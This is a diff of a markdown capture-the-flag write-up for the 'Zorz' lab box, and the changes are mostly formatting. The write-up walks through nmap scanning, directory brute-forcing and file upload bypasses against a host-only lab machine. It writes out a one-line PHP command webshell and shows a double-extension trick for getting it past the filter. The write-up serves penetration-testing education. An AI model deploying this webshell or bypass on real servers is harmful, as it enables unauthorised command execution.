@@ -1,7 +1,11 @@
 [Main Page](../index.md)<br>
 
 
-# A Few WebApp File Upload Vulnerabilities Explained - CTF Writeup: Zorz
+# CTF Writeup:
+# Zorz - A Few WebApp File Upload Vulnerabilities Explained
+<br>
+![Logo](https://i.imgur.com/IAAnDbY.png)
+<br>
 ## 20 November 2017
 
 
@@ -17,11 +21,6 @@ If you solve one or all three pages, please send me an email and quick write up 
 Your goal is to successfully upload a webshell or malicious file to the server.
 If you can execute system commands on this box, thats good enough!!!
 I hope you have fun! admin@top-hat-sec.com*
-
-
-<br>
-![Logo](https://i.imgur.com/IAAnDbY.png)
-<br>
 
 
 
@@ -57,7 +56,7 @@ Then you are ready to begin!
 First thing we will need to do is FIND the box.
 By default, our host only network is set to `192.168.56.0-255`, so we will scan it with nmap.
 
-`nmap -sn -T5 192.168.56.0/24`
+* `nmap -sn -T5 192.168.56.0/24`
 
 <br>
 ![A1](https://i.imgur.com/GowJwKc.png)
@@ -70,7 +69,7 @@ Normally I go ahead and add this to `/etc/hosts`, but this caused me some troubl
 We know from the description that the box is running a webserver, but just to confirm this we will run a fast nmap scan.
 We'll also create a new directory to keep ourselves organized.
 
-`nmap -F -T4 192.168.56.102`
+* `nmap -F -T4 192.168.56.102`
 
 <br>
 ![A2](https://i.imgur.com/r9pjQVX.png)
@@ -100,7 +99,7 @@ Here is our [Test Burrito!](https://i.imgur.com/29eCDkq.jpg)
 If you want to change the file type, just change the URL’s extension to .gif or .png to download other versions.
 Save it with
 
-`wget https://i.imgur.com/29eCDkq.png -O test_burrito.png`
+* `wget https://i.imgur.com/29eCDkq.png -O test_burrito.png`
 
 
 Go to the upload page and try to upload it – let’s see what happens.
@@ -132,7 +131,7 @@ It can be found at `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
 
 Let’s make a copy into our working ‘a_pentest’ directory.
 
-`cp /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt dir_list.txt`
+* `cp /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt dir_list.txt`
 
 or download it from the above link.
 
@@ -142,10 +141,10 @@ It runs in Python 3, meaning you will not have any trouble getting it to run on 
 On my Kali system, I have mine installed to /opt/Web_Tools, but you can download it to and run it from your current directory as well.
 
 
-`git clone https://github.com/maurosoria/dirsearch` will clone the repository to your current directory.
+* `git clone https://github.com/maurosoria/dirsearch` will clone the repository to your current directory.
 
 
-`git clone https://github.com/maurosoria/dirsearch/opt/dirsearch` will clone it to a folder called dirsearch in your /opt/ directory.
+* `git clone https://github.com/maurosoria/dirsearch/opt/dirsearch` will clone it to a folder called dirsearch in your /opt/ directory.
 
 
 Dirsearch requires some extensions to test for, but we aren’t looking for any of those right now.
@@ -153,7 +152,7 @@ The last page we saw used the .php extension, so we will use .php.
 Make sure you run the command in the same directory as your copy of the wordlist, or you will have to specify the full path there as well.
 
 
-`python3 /opt/Web_Tools/dirsearch/dirsearch.py -u http://192.168.56.102/ -e php -w dir_list.txt`
+* `python3 /opt/Web_Tools/dirsearch/dirsearch.py -u http://192.168.56.102/ -e php -w dir_list.txt`
 
 <br>
 ![A7-dirsearch](https://i.imgur.com/20PTd8K.png)
@@ -186,7 +185,7 @@ Let’s try some arbitrary text file, and see if that will work for us.
 Create a simple textfile and try to upload it the same way.
 I am going to create mine using…
 
-`echo 'An image is worth 1000 words.' > proverb.txt`
+* `echo 'An image is worth 1000 words.' > proverb.txt`
 
 Let’s try uploading it.
 
@@ -215,7 +214,7 @@ I got this microshell script from the Red Team Field Manual by Ben Clark.
 
 I save mine to a text file using echo.
 
-`echo '<?php passthru($_GET["cmd"]); ?>' > php-microshell.php`
+* `echo '<?php passthru($_GET["cmd"]); ?>' > php-microshell.php`
 
 You can copy and paste if you like, but make sure that your browser doesn’t change the quotation mark characters out of plaintext!
 If you want to be sure, just delete them and add them yourself.
@@ -289,7 +288,7 @@ This uploader must be checking to see that our files really are images.
 Let’s see if we can overcome this hurdle using caveman method and just append ".png" to the end of our script’s filename.
 
 
-`cp php-microshell.php php-microshell.png.php`
+* `cp php-microshell.php php-microshell.png.php`
 
 
 It is possible that we can trick the file checker this way, if it is only looking at the filename itself.
@@ -320,7 +319,7 @@ Firefox does have built in proxy preferences, but endorses the FoxyProxy plugin 
 If you aren’t using Kali, go ahead and download the latest version of FoxyProxy and skip the next section.
 
 
-__Kali and FoxyProxy:__
+### Kali and FoxyProxy:
 
 At the time of this writing, FoxyProxy’s newest available version doesn’t play well with Kali’s LTS Firefox version. This isn’t that much of a problem, since we can still use the “Old” version from earlier this year.
 
